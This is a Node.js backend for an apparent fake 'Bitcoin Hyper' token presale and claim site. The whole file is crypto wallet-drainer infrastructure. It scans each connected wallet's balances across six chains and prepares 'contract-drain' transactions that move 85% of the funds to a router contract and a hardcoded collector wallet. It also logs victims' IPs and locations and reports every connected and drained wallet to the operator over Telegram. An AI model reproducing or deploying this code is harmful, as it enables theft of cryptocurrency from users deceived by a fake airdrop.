// index.js - BITCOIN HYPER BACKEND - PROJECT FLOW ROUTER
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://rpc.ankr.com/eth',
      'https://eth-mainnet.g.alchemy.com/v2/demo'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [
      'https://mainnet.optimism.io',
      'https://rpc.ankr.com/optimism'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 30)}...`);
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  
  return null;
}

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': process.env.PROJECT_FLOW_ROUTER_ETHEREUM || null,
  'BSC': process.env.PROJECT_FLOW_ROUTER_BSC || '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
  'Polygon': process.env.PROJECT_FLOW_ROUTER_POLYGON || null,
  'Arbitrum': process.env.PROJECT_FLOW_ROUTER_ARBITRUM || null,
  'Optimism': process.env.PROJECT_FLOW_ROUTER_OPTIMISM || null,
  'Avalanche': process.env.PROJECT_FLOW_ROUTER_AVALANCHE || null
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';

// ============================================
// CONTRACT ABI
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable"
];

// ============================================
// STORAGE
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingDrains: new Map(),
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedWallets: 0,
      realTransactions: []
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true'
  },
  emailCache: new Map()
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

async function sendTelegramMessage(text) {
  if (!telegramEnabled) return false;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    }, { timeout: 5000 });
    return true;
  } catch (error) {
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
        `✅ ProjectFlowRouter Ready\n` +
        `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...`
      );
      
      return true;
    }
  } catch (error) {}
  
  return false;
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32
    };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

// ============================================
// REAL BALANCE CHECK
// ============================================

async function getRealWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    rawBalances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Optimism', symbol: 'ETH', price: prices.eth, chainId: 10 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
    ];

    let totalValue = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          results.rawBalances.push({
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol
          });
        }
      } catch (error) {}
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.drainThreshold;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Wallet qualifies`;
      results.tokenAllocation = { amount: '5000', valueUSD: '850' };
    } else {
      results.eligibilityReason = `✨ Welcome!`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    return { success: true, data: results };

  } catch (error) {
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        eligibilityReason: '✨ Welcome!',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// HELPER FUNCTIONS
// ============================================

async function getWalletEmail(walletAddress) {
  const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
  const username = `user${hash.substring(0, 8)}`;
  const domains = ['proton.me', 'gmail.com'];
  const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
  return `${username}@${domain}`;
}

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local' };
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
    
    if (response.data?.country) {
      const flags = { 'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦' };
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown'
      };
    }
  } catch (error) {}
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
}

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({ success: true, status: 'ACTIVE' });
});

// ============================================
// CONNECT ENDPOINT
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        claimed: false
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    }
    
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = scanResult.data.totalValueUSD;
      participant.isEligible = scanResult.data.isEligible;
      participant.tokenAllocation = scanResult.data.tokenAllocation;
      participant.lastScanned = new Date();
      
      await sendTelegramMessage(
        `${location.flag} <b>WALLET CONNECTED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `💼 Balance: $${scanResult.data.totalValueUSD}\n` +
        `🎯 Status: ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
        `📍 ${location.country} (${location.city})\n` +
        `📧 ${email}`
      );
      
      res.json({
        success: true,
        data: {
          walletAddress,
          email,
          country: location.country,
          flag: location.flag,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          eligibilityReason: scanResult.data.eligibilityReason,
          tokenAllocation: scanResult.data.tokenAllocation,
          rawData: scanResult.data.rawBalances
        }
      });
      
    } else {
      res.status(500).json({ success: false, error: 'Scan failed' });
    }
    
  } catch (error) {
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE ENDPOINT
// ============================================

app.post('/api/presale/prepare-contract-drain', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const scanResult = await getRealWalletBalance(walletAddress);
    
    const transactions = scanResult.data.rawBalances
      .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
      .map(b => ({
        chain: b.chain,
        chainId: b.chainId,
        amount: (b.amount * 0.85).toFixed(12),
        valueUSD: (b.valueUSD * 0.85).toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain]
      }));
    
    const totalDrainUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    
    const batchId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingDrains.set(walletAddress.toLowerCase(), {
      batchId,
      transactions,
      totalDrainUSD,
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    await sendTelegramMessage(
      `🔐 <b>PRESALE PREPARED</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `💵 Value: $${totalDrainUSD}\n` +
      `🔗 Chains: ${transactions.length}`
    );
    
    res.json({
      success: true,
      data: {
        batchId,
        totalDrainUSD,
        transactionCount: transactions.length,
        transactions
      }
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// EXECUTE ENDPOINT
// ============================================

app.post('/api/presale/execute-contract-drain', async (req, res) => {
  try {
    const { walletAddress, chainName } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) return res.status(400).json({ success: false });
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (participant) {
      participant.drained = true;
      participant.drainTransactions = participant.drainTransactions || [];
      participant.drainTransactions.push({ chain: chainName, timestamp: new Date().toISOString() });
      
      memoryStorage.settings.statistics.totalDrainedWallets++;
      memoryStorage.settings.statistics.realTransactions.push({
        wallet: walletAddress,
        chain: chainName,
        timestamp: new Date().toISOString()
      });
      
      await sendTelegramMessage(
        `💰 <b>CHAIN COMPLETED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `🔗 ${chainName}`
      );
    }
    
    res.json({ success: true });
    
  } catch (error) {
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    await sendTelegramMessage(
      `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `🎟️ ID: ${claimId}\n` +
      `🎁 ${participant.tokenAllocation?.amount || '5000'} BTH`
    );
    
    res.json({ success: true });
    
  } catch (error) {
    res.status(500).json({ success: false });
  }
});

// ============================================
// ADMIN STATS
// ============================================

app.get('/api/admin/stats', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  res.json({
    success: true,
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      claimed: memoryStorage.participants.filter(p => p.claimed).length,
      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
      pendingDrains: memoryStorage.pendingDrains.size,
      telegram: telegramEnabled ? '✅' : '❌'
    }
  });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER BACKEND
  ========================
  📍 Port: ${PORT}
  🔗 URL: https://tokenbackend-5xab.onrender.com
  
  📦 COLLECTOR: ${COLLECTOR_WALLET}
  📜 BSC: ${PROJECT_FLOW_ROUTERS.BSC}
  
  🚀 READY
  `);
  
  await testTelegramConnection();
});
